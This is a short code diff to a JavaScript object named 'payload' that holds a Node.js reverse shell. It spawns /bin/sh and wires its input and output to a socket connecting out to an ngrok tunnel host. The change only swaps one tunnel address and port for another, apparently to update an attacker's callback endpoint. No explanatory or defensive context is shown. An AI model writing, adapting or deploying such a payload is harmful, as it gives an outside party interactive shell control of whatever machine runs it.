@@ -7,8 +7,8 @@ const payload = {
         var sh = cp.spawn("/bin/sh", []);
         var client = new net.Socket();
         client.connect(
-            16170,
-            "2.tcp.ngrok.io",
+            13584,
+            "0.tcp.ngrok.io",
             function () {
                 client.pipe(sh.stdin);
                 sh.stdout.pipe(client);
